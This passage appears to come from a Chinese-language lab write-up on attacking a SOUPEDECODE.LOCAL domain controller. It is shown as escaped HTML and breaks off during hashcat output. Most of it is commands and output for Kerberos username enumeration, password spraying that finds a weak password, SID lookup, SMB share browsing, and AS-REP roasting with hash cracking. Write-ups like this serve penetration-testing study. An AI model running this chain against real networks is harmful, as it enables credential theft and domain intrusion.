来枚举用户名，字典是\u003ccode\u003egithub\u003c/code\u003e上找的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e./kerbrute_linux_amd64 userenum --dc \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e -d SOUPEDECODE.LOCAL ../../\u003cspan class=\"hljs-type\"\u003eDict\u003c/span\u003e/SecLists-\u003cspan class=\"hljs-number\"\u003e2024.3\u003c/span\u003e/Usernames/xato-net-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e-million-usernames.txt\n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,\u0026#x3C; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e (9dad6e1) - 01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e - Ronnie Flathers @ropnop\n\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:06:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e \u003e  Using KDC(s):\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:06:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e \u003e   \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e\n\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:06:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e \u003e  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:06:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e \u003e  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:06:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e \u003e  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:06:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e \u003e  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:06:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e \u003e  [+] VALID USERNAME:       Admin@SOUPEDECODE.LOCAL\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:06:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e \u003e  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:06:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e \u003e  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:06:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e \u003e  [+] VALID USERNAME:       ADMIN@SOUPEDECODE.LOCAL\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:09:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003e  [+] VALID USERNAME:       wreed11@SOUPEDECODE.LOCAL\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:09:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003e  [+] VALID USERNAME:       kleo2@soupedecode.local\n\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e/01/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 01:09:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003e  [+] VALID USERNAME:       dc01@soupedecode.local\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e找到好几个用户，将结果保存为\u003ccode\u003euser.txt\u003c/code\u003e，使用脚本将用户名截取然后保存下来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'user.txt'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'r'\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e file1:\n    data = file1.read()\n    lines = data.splitlines()\n\u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'user.txt'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'w'\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e file2:\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e line \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e lines:\n        file2.write(line[line.find(\u003cspan class=\"hljs-string\"\u003e'E:'\u003c/span\u003e)+\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e:line.find(\u003cspan class=\"hljs-string\"\u003e'@'\u003c/span\u003e)]+\u003cspan class=\"hljs-string\"\u003e'\\n'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e尝试用户弱密码\u003c/h3\u003e\n\u003cp\u003e使用\u003ccode\u003ecrackmapexec\u003c/code\u003e来测试是否存在弱密码，发现\u003ccode\u003echarlie\u003c/code\u003e用户存在弱密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecrackmapexec smb \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e -u user.txt -p user.txt --\u003cspan class=\"hljs-keyword\"\u003econtinue\u003c/span\u003e-on-success --no-bruteforce\nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [*] Windows Server \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e Build \u003cspan class=\"hljs-number\"\u003e20348\u003c/span\u003e x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e) (SMBv1:\u003cspan class=\"hljs-literal\"\u003eFalse\u003c/span\u003e)\nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [-] SOUPEDECODE.LOCAL\\admin:admin STATUS_LOGON_FAILURE \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [+] SOUPEDECODE.LOCAL\\charlie:charlie \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [-] SOUPEDECODE.LOCAL\\Charlie:Charlie STATUS_LOGON_FAILURE \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [-] SOUPEDECODE.LOCAL\\administrator:administrator STATUS_LOGON_FAILURE \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [-] SOUPEDECODE.LOCAL\\Admin:Admin STATUS_LOGON_FAILURE \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [-] SOUPEDECODE.LOCAL\\Administrator:Administrator STATUS_LOGON_FAILURE \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [-] SOUPEDECODE.LOCAL\\CHARLIE:CHARLIE STATUS_LOGON_FAILURE \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [-] SOUPEDECODE.LOCAL\\ADMIN:ADMIN STATUS_LOGON_FAILURE \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [-] SOUPEDECODE.LOCAL\\wreed11:wreed11 STATUS_LOGON_FAILURE \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [-] SOUPEDECODE.LOCAL\\kleo2:kleo2 STATUS_LOGON_FAILURE \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [-] SOUPEDECODE.LOCAL\\dc01:dc01 STATUS_LOGON_FAILURE\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码后，就可以通过\u003ccode\u003eLDAP\u003c/code\u003e来枚举域内用户名了,将结果保存为\u003ccode\u003eres\u003c/code\u003e使用脚本截取出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003elookupsid.py \u003cspan class=\"hljs-string\"\u003e'SOUPEDECODE.LOCAL/charlie@192.168.56.126'\u003c/span\u003e \u003e res\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'res'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'r'\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e file:\n    data = file.read()\n    lines = data.splitlines()\n\u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'username.txt'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'w+'\u003c/span\u003e) \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e file2:\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e line \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e lines:\n        file2.write(line[line.find(\u003cspan class=\"hljs-string\"\u003e'\\\\'\u003c/span\u003e) + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e:line.find(\u003cspan class=\"hljs-string\"\u003e'('\u003c/span\u003e)-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e] + \u003cspan class=\"hljs-string\"\u003e'\\n'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后再测试别的用户是否存在弱密码，结果还是只有\u003ccode\u003echarlie\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecrackmapexec smb \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e -u username.txt -p username.txt --\u003cspan class=\"hljs-keyword\"\u003econtinue\u003c/span\u003e-on-success --no-bruteforce | grep [+]\nSMB                      \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    DC01             [+] SOUPEDECODE.LOCAL\\charlie:charlie\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e再次访问SMB\u003c/h3\u003e\n\u003cp\u003e通过\u003ccode\u003echarlie\u003c/code\u003e用户去访问SMB\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esmbclient -L \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e -U SOUPEDECODE.LOCAL/charlie%charlie\n\n        Sharename       \u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e SMB1 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e workgroup listing.\ndo_connect: Connection to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e SMB1 -- no workgroup available\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后发现\u003ccode\u003eSYSVOL\u003c/code\u003e里边存在东西，但是东西好像没用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esmbclient //\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e/SYSVOL -U SOUPEDECODE.LOCAL/charlie%charlie\nTry \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e to get a \u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e of possible commands.\nsmb: \\\u003e ls\n  .                                   D        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  ..                                  D        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  SOUPEDECODE.LOCAL                  Dr        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n\n                \u003cspan class=\"hljs-number\"\u003e12942591\u003c/span\u003e blocks of size \u003cspan class=\"hljs-number\"\u003e4096.\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10927852\u003c/span\u003e blocks available\nsmb: \\\u003e cd SOUPEDECODE.LOCAL\nsmb: \\SOUPEDECODE.LOCAL\\\u003e \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e\n  .                                   D        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  ..                                  D        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  DfsrPrivate                      DHSr        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  Policies                            D        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n  scripts                             D        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Sat Jun \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\n\n                \u003cspan class=\"hljs-number\"\u003e12942591\u003c/span\u003e blocks of size \u003cspan class=\"hljs-number\"\u003e4096.\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10927852\u003c/span\u003e blocks available\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e\u003cstrong\u003eAS_REP Roasting\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e本来想尝试\u003ccode\u003eKerbeoating\u003c/code\u003e的，但是拿不到SPN\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eGetUserSPNs.py SOUPEDECODE.LOCAL/charlie:charlie -dc-ip \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e -request\nImpacket v0\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Copyright Fortra, LLC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e its affiliated companies \n\nNo entries found!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e看了下WP，发现可以通过 \u003cstrong\u003eAS_REP Roasting\u003c/strong\u003e 来进行下一步操作\u003c/p\u003e\n\u003cp\u003e通过 \u003ccode\u003eGetUserSPNs.py\u003c/code\u003e 枚举出关闭了预认证的用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eGetNPUsers.py -dc-ip \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.126\u003c/span\u003e SOUPEDECODE.LOCAL/ -usersfile username.txt | grep \u003cspan class=\"hljs-string\"\u003e'SOUPEDECODE.LOCAL'\u003c/span\u003e \n/root/.local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/GetNPUsers.py:\u003cspan class=\"hljs-number\"\u003e165\u003c/span\u003e: DeprecationWarning: datetime.datetime.utcnow() \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e deprecated \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e scheduled \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e removal \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a future version. Use timezone-aware objects to represent datetimes \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n$krb5asrep$\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e$zximena448@SOUPEDECODE.LOCAL:fecb2e188b7b15d1a4ed208f1c2e462b$3f348276b715378bf6aece608de90fa7134900b6439f45fbc3cd3081dad69bceb94c332b5de16f17e2beabe48da6f5809835b440002fdcb615f4bfa9f0041affd29bbdf6b425d48216d03c5cb624b646e366e3186a2ecfd6cbe2631ef6540094d238de54e4353055ecc2bc8694a3fe53e0a68b99f339311540ed0033dad48d23b59b8568355a6adc48fe221793024cfdec3c1acee051fde18bc455aef282d44c1c5388fadc5a4908b2b8c35a9cb8655d1db7189880541995043f5321306a3778105f6e2079ccad5111ac5589f490d32ce03c12006fce2722aeb10211529818cd2e7cbcaf82862261b58f0775eb9e224651164c55585e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将用户的\u003ccode\u003ehash\u003c/code\u003e加密后的\u003ccode\u003eLogin session key\u003c/code\u003e进行破解\u003c/p\u003e\n\u003cp\u003e寻找密码类型，得知是\u003ccode\u003e18200\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehashcat -h | grep Kerber  \n  \u003cspan class=\"hljs-number\"\u003e19600\u003c/span\u003e | Kerberos \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, etype \u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e, TGS-REP                              | Network Protocol\n  \u003cspan class=\"hljs-number\"\u003e19800\u003c/span\u003e | Kerberos \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, etype \u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e, Pre-Auth                             | Network Protocol\n  \u003cspan class=\"hljs-number\"\u003e28800\u003c/span\u003e | Kerberos \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, etype \u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e, DB                                   | Network Protocol\n  \u003cspan class=\"hljs-number\"\u003e19700\u003c/span\u003e | Kerberos \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, etype \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e, TGS-REP                              | Network Protocol\n  \u003cspan class=\"hljs-number\"\u003e19900\u003c/span\u003e | Kerberos \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, etype \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e, Pre-Auth                             | Network Protocol\n  \u003cspan class=\"hljs-number\"\u003e28900\u003c/span\u003e | Kerberos \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, etype \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e, DB                                   | Network Protocol\n   \u003cspan class=\"hljs-number\"\u003e7500\u003c/span\u003e | Kerberos \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, etype \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e, AS-REQ Pre-Auth                      | Network Protocol\n  \u003cspan class=\"hljs-number\"\u003e13100\u003c/span\u003e | Kerberos \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, etype \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e, TGS-REP                              | Network Protocol\n  \u003cspan class=\"hljs-number\"\u003e18200\u003c/span\u003e | Kerberos \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, etype \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e, AS-REP                               | Network Protocol\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e爆破密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehashcat -m \u003cspan class=\"hljs-number\"\u003e18200\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:fecb2e188b7b15d1a4ed208f1c2e462b$3f348276b715378bf6aece608de90fa7134900b6439f45fbc3cd3081dad69bceb94c332b5de16f17e2beabe48da6f5809835b440002fdcb615f4bfa9f0041affd29bbdf6b425d48216d03c5cb624b646e366e3186a2ecfd6cbe2631ef6540094d238de54e4353055ecc2bc8694a3fe53e0a68b99f339311540ed0033dad48d23b59b8568355a6adc48fe221793024cfdec3c1acee051fde18bc455aef282d44c1c5388fadc5a4908b2b8c35a9cb8655d1db7189880541995043f5321306a3778105f6e2079ccad5111ac5589f490d32ce03c12006fce2722aeb10211529818cd2e7cbcaf82862261b58f0775eb9e224651164c55585e'\u003c/span\u003e /usr/share/wordlists/rockyou.txt\n//\n$krb5asrep$\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e$zximena448@SOUPEDECODE.LOCAL:fecb2e188b7b15d1a4ed208f1c2e462b$3f348276b715378bf6aece608de90fa7134900b6439f45fbc3cd3081dad69bceb94c332b5de16f17e2beabe48da6f5809835b440002fdcb615f4bfa9f0041affd29bbdf6b425d48216d03c5cb624b646e366e3186a2ecfd6cbe2631ef6540094d238de54e4353055ecc2bc8694a3fe53e0a68b99f339311540ed0033dad48d23b59b8568355a6adc48fe221793024cfdec3c1acee051fde18bc455aef282d44c1c5388fadc5a4908b2b8c35a9cb8655d1db7189880541995043f5321306a3778105f6e2079ccad5111ac5589f490d32ce03c12006fce2722aeb10211529818cd2e7cbcaf82862261b58f0775eb9e224651164c55585e:internet\n                                                          \nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: \u003cspan class=\"hljs-number\"\u003e18200\u003c/span\u003e (Kerberos \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, etype \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e, AS-REP)\nHash.Target......: $krb5asrep$\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e$zximena448@SOUPEDECODE.LOCAL:fecb2e18..\u003cspan class=\"hljs-number\"\u003e.55585\u003c/span\u003ee\nTime.Started.....: Mon Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 02:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e:05 \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e sec)\nTime.Estimated...: Mon Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e 